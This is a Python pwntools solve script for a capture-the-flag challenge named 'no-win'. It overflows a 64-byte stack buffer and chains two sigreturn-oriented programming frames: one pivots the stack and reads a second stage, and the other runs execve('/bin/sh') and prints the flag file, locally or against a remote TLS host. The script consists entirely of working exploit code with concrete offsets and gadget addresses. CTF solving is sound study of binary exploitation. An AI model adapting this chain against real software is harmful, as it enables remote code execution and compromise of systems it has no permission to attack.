#!/usr/bin/env python3
# no-win -- read(0, buf[64], 512), and main has no stack canary, so the
# return address sits 72 bytes in. The binary is static/non-PIE but has
# *no* `pop rdi`/`pop rsi` gadgets at all ("no win(), so good luck") --
# only `pop rax; ret` and `syscall; ret`, which is exactly enough for SROP.
#   stage 1: rt_sigreturn -> read(0, STAGE, 0x400) with rsp pivoted to STAGE
#   stage 2: lands on the new stack -> rt_sigreturn -> execve("/bin/sh")
#   usage: ./solve.py            (local)
#          ./solve.py host:1337  (remote, TLS)
import sys
from pwn import *

context.arch = 'amd64'
context.log_level = 'warn'

elf = ELF('./pwn_no-win/handout/no-win', checksec=False)
POP_RAX = 0x427eeb          # pop rax ; ret
SYSCALL = 0x410f46          # syscall ; ret
STAGE   = elf.bss() + 0x800 # scratch page: doubles as the pivoted stack
OFFSET  = 72                # buf at rbp-0x40 -> 64 + 8 (saved rbp)

f = SigreturnFrame()
f.rax, f.rdi, f.rsi, f.rdx = constants.SYS_read, 0, STAGE, 0x400
f.rip, f.rsp = SYSCALL, STAGE
# Pad to exactly 512 so the first read() consumes stage 1 and nothing more.
stage1 = (b'A' * OFFSET + p64(POP_RAX) + p64(15) + p64(SYSCALL) + bytes(f)).ljust(512, b'\x00')

g = SigreturnFrame()
g.rax, g.rsi, g.rdx, g.rip = constants.SYS_execve, 0, 0, SYSCALL
binsh_off = 24 + len(bytes(g))        # frame is 304 bytes here, not 248
g.rdi = STAGE + binsh_off
stage2 = p64(POP_RAX) + p64(15) + p64(SYSCALL) + bytes(g) + b'/bin/sh\x00'

if len(sys.argv) > 1 and ':' in sys.argv[1]:
    host, port = sys.argv[1].rsplit(':', 1)
    io = remote(host, int(port), ssl=True, timeout=10)
else:
    io = process(elf.path)

io.recvuntil(b'> ')
io.send(stage1)
time.sleep(0.3)
io.send(stage2)
time.sleep(0.3)
io.sendline(b'cat /flag.txt 2>/dev/null || cat flag.txt')
print(io.recvrepeat(4).decode(errors='replace').strip())
